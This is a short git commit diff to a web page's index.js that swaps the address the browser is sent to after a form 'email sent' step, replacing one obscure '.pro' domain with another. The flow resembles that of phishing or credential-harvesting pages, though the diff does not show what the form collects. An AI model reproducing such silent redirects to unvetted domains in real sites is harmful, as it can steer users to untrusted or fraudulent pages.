b2fdfc4885c97fffbf31adfb4726679c678bdd59
husknet <127146284+husknet@users.noreply.github.com>
2024-12-20 14:09:10 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://ctfn.fout-foline.pro';
+        window.location.href = 'https://fnd.abruis.pro/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
